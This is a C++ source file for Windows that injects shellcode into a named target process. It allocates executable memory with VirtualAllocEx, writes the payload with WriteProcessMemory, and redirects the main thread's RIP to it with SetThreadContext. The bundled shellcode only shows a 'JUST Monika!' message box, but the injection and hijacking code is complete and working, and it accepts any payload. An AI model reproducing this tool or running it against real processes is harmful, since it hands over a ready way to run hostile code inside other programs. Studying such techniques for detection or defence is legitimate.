#include <windows.h>
#include <tlhelp32.h>
#include <cstdio>

// Corrected Shellcode to inject
const BYTE shellcode[] = {
    0x55,                          // push rbp
    0x48, 0x8B, 0xEC,              // mov rbp, rsp
    0xE8, 0x00, 0x00, 0x00, 0x00,  // call $+5 (self-relative)
    0x5A,                          // pop rdx
    0x48, 0x83, 0xC2, 0x21,        // add rdx, 0x21 (adjust rdx to point to "JUST Monika!")
    0x48, 0x31, 0xC9,              // xor rcx, rcx (HWND = NULL)
    0x4C, 0x8B, 0xC2,              // mov r8, rdx
    0x49, 0x83, 0xC0, 0x0d,        // add r8, 0x0d (adjust R8 to point to "ALERT")
    0x4D, 0x31, 0xC9,              // xor r9, r9 (uType = MB_OK)
    0x48, 0xB8, 0x60, 0xE0, 0x94, 0x1A, 0xFC, 0x7F, 0x00, 0x00, // mov rax, <MessageBoxA address>
    0xFF, 0xD0,                    // call rax (call MessageBoxA)
    0x5D,                          // pop rbp
    0xC3,                          // ret
    0x90, 0x90,                    // nop nop (padding)
    // MessageBox strings (null-terminated)
    'J', 'U', 'S', 'T', ' ', 'M', 'o', 'n', 'i', 'k', 'a', '!', 0x00, // "JUST Monika!"
    'A', 'L', 'E', 'R', 'T', 0x00                                     // "ALERT"
};

// Function prototype for NtQuerySystemInformation
typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

#define SystemProcessInformation 5

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// Define CLIENT_ID structure
typedef struct _CLIENT_ID {
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Define SYSTEM_THREAD_INFORMATION structure
typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    ULONG Priority;
    ULONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    ULONG WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

// Define SYSTEM_PROCESS_INFORMATION structure
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

// Function to check if a thread is in a safe state for hijacking
bool IsThreadSafeToHijack(DWORD processId, DWORD threadId)
{
    // Load NtQuerySystemInformation
    static HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
    {
        printf("Failed to load ntdll.dll\n");
        exit(1);
    }

    static NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation)
    {
        printf("Failed to get address of NtQuerySystemInformation\n");
        exit(1);
    }

    static ULONG bufferSize = 1024 * 1024; // !MB should be enough
    static PSYSTEM_PROCESS_INFORMATION processInfoBuf = (PSYSTEM_PROCESS_INFORMATION)malloc(bufferSize);

    // if(bufferSize == 0 || !processInfoBuf)
    // {
    //     NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
    //     processInfoBuf = (PSYSTEM_PROCESS_INFORMATION)malloc(bufferSize);
    //     if (!processInfoBuf)
    //     {
    //         printf("Failed to allocate memory for process information\n");
    //         exit(1);
    //     }
    // }

    if (NtQuerySystemInformation(SystemProcessInformation, processInfoBuf, bufferSize, &bufferSize) != 0)
    {
        printf("Failed to get process information\n");
        return false;
    }

    // Iterate through all processes
    PSYSTEM_PROCESS_INFORMATION currentProcess = processInfoBuf;
    while (true)
    {
        if ((DWORD)(ULONG_PTR)currentProcess->UniqueProcessId == processId)
        {
            // Found the target process, iterate through its threads
            for (ULONG i = 0; i < currentProcess->NumberOfThreads; i++)
            {
                SYSTEM_THREAD_INFORMATION threadInfo = currentProcess->Threads[i];
                if ((DWORD)(ULONG_PTR)threadInfo.ClientId.UniqueThread == threadId)
                {
                    printf("Thread %lu: State=%lu, WaitReason=%lu\n", threadId, threadInfo.ThreadState, threadInfo.WaitReason);
                    // Check if the thread is in a safe state (e.g., running or waiting for user input)
                    if (threadInfo.ThreadState == 2 /* Running */ || threadInfo.WaitReason == 5 /* UserRequest */)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
        }

        if (currentProcess->NextEntryOffset == 0)
            break;
        currentProcess = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)currentProcess + currentProcess->NextEntryOffset);
    }

    return false;
}


// Function to get the PID of the target process by name
DWORD GetProcessIdByName(const char* processName)
{
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD processId = 0;
    if (Process32First(hProcessSnap, &pe32))
    {
        do
        {
            if (strcmp(pe32.szExeFile, processName) == 0)
            {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return processId;
}

// Function to find the main thread of the target process
DWORD GetMainThreadId(DWORD processId)
{
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return 0;

    DWORD mainThreadId = 0;
    FILETIME earliestTime = { MAXDWORD, MAXDWORD };

    if (Thread32First(hThreadSnap, &te32))
    {
        do
        {
            if (te32.th32OwnerProcessID == processId)
            {
                HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te32.th32ThreadID);
                if (hThread)
                {
                    FILETIME creationTime, exitTime, kernelTime, userTime;
                    if (GetThreadTimes(hThread, &creationTime, &exitTime, &kernelTime, &userTime))
                    {
                        if (CompareFileTime(&creationTime, &earliestTime) < 0)
                        {
                            earliestTime = creationTime;
                            mainThreadId = te32.th32ThreadID;
                        }
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}

// Function to inject shellcode into the target process and return the address of the remote memory
LPVOID InjectShellcode(DWORD processId)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess)
    {
        printf("Failed to open process with PID %lu\n", processId);
        return NULL;
    }

    // Allocate memory in the target process
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory)
    {
        printf("Failed to allocate memory in the target process\n");
        CloseHandle(hProcess);
        return NULL;
    }
    printf("Allocated RWX memory at address: 0x%p\n", remoteMemory);

    // Write the shellcode to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL))
    {
        printf("Failed to write shellcode to the allocated memory\n");
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return NULL;
    }
    printf("Shellcode written to remote memory successfully\n");

    CloseHandle(hProcess);
    return remoteMemory;
}

// Function to hijack the main thread and set its RIP to the injected shellcode
bool HijackMainThread(DWORD processId, DWORD mainThreadId, LPVOID shellcodeAddress)
{
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, mainThreadId);
    if (!hThread)
    {
        printf("Failed to open main thread with TID %lu\n", mainThreadId);
        return false;
    }

    // Suspend the thread and get its context
    SuspendThread(hThread);
    printf("Suspended main thread with TID %lu\n", mainThreadId);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(hThread, &ctx))
    {
        printf("Original RIP: 0x%p\n", (LPVOID)ctx.Rip);

        // Set RIP to the shellcode address
        ctx.Rip = (DWORD64)shellcodeAddress;
        printf("Hijacking RIP to address: 0x%p\n", shellcodeAddress);

        // Update the thread context
        if (!SetThreadContext(hThread, &ctx))
        {
            printf("Failed to set thread context\n");
            ResumeThread(hThread);
            CloseHandle(hThread);
            return false;
        }
    }
    else
    {
        printf("Failed to get thread context\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        return false;
    }

    // Resume the thread
    ResumeThread(hThread);
    printf("Resumed main thread with TID %lu\n", mainThreadId);
    CloseHandle(hThread);
    return true;
}

int main()
{
    const char* targetProcessName = "target.exe"; // Replace with your target process name
    DWORD processId = GetProcessIdByName(targetProcessName);

    if (!processId)
    {
        printf("Target process \"%s\" not found. Exiting.\n", targetProcessName);
        return 1;
    }

    printf("Target process \"%s\" found with PID %lu\n", targetProcessName, processId);

    // Inject shellcode and get the remote memory address
    LPVOID remoteMemory = InjectShellcode(processId);
    if (!remoteMemory)
    {
        printf("Failed to inject shellcode.\n");
        return 1;
    }

    // Get the main thread ID
    DWORD mainThreadId = GetMainThreadId(processId);
    if (!mainThreadId)
    {
        printf("Failed to find main thread.\n");
        return 1;
    }

    printf("Main thread found with TID %lu\n", mainThreadId);

    // Wait until the main thread is in a safe state to hijack
    printf("Waiting for the main thread to be in a safe state to hijack...\n");
    while (!IsThreadSafeToHijack(processId, mainThreadId))
    {
        // Sleep for a short duration before checking again
        Sleep(10);
    }

    // Hijack the main thread
    if (HijackMainThread(processId, mainThreadId, remoteMemory))
        printf("Shellcode injected and main thread hijacked successfully.\n");
    else
        printf("Failed to hijack main thread.\n");

    return 0;
}
